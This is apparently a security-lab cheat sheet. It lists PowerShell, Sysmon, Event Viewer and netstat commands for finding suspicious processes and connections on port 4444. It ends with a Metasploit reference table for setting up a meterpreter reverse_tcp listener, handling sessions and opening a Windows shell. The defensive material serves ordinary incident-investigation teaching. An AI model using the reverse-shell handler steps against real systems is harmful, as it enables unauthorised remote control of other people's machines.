PowerShell Event Investigation

# Get all Sysmon events
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational'

# Get process creation events (ID=1)
Get-WinEvent -FilterHashtable @{logname='Microsoft-Windows-Sysmon/Operational'; id=1}

# Get network connection events (ID=3)
Get-WinEvent -FilterHashtable @{logname='Microsoft-Windows-Sysmon/Operational'; id=3} -MaxEvents 1 | Format-List *

# Find connections to port 4444
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -FilterXPath "*[System/EventID=3 and EventData[Data[@Name='DestinationPort']='4444']]" | Format-List *

# Get process by PID
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -FilterXPath "*[System/EventID=1 and EventData[Data[@Name='ProcessId']='[PID]']]" | Format-List *

# Get all TCP connections
Get-NetTCPConnection

# Find connection to specific IP
Get-NetTCPConnection | Where-Object { $_.RemoteAddress -like '192*' }

# Find connection to specific port
Get-NetTCPConnection | Where-Object { $_.RemotePort -eq 4444 }

# Get process info by name
Get-CimInstance Win32_Process | Select-Object Name, ParentProcessId, ProcessId | Where-Object { $_.Name -like '*suspicious*' }

# Get full command line for PID
Get-CimInstance Win32_Process -Filter 'ProcessId=6200' | Select-Object Name, ProcessId, CommandLine

Event Viewer — XML Query

Use in Event Viewer > Filter Current Log > XML tab:

*[System[Provider[@Name='Microsoft-Windows-Sysmon']]]
and *[EventData[Data[@Name='ProcessId'] and (Data='YOUR_PID_HERE')]]

Windows netstat Commands

# Show all connections with PIDs
netstat -ano

# Find specific port connection
netstat -an | findstr 4444

# Show connections with process names
netstat -anob

Meterpreter / Metasploit Reference

From the Lab — remember the payload/handler distinction!
CommandWhat It Does
msfconsoleStart Metasploit
use exploit/multi/handlerSet up listener for reverse shell
set PAYLOAD windows/meterpreter/reverse_tcpSet payload type
set LHOST [your IP]Your listener IP
set LPORT 4444Your listener port
exploitStart the listener
sessions -lList active sessions
sessions -i [ID]Interact with session
shellDrop into Windows shell from Meterpreter
exitLeave session
Remember: meterpreter/reverse_tcp is a PAYLOAD not an exploit module. Always use exploit/multi/handler with set PAYLOAD.
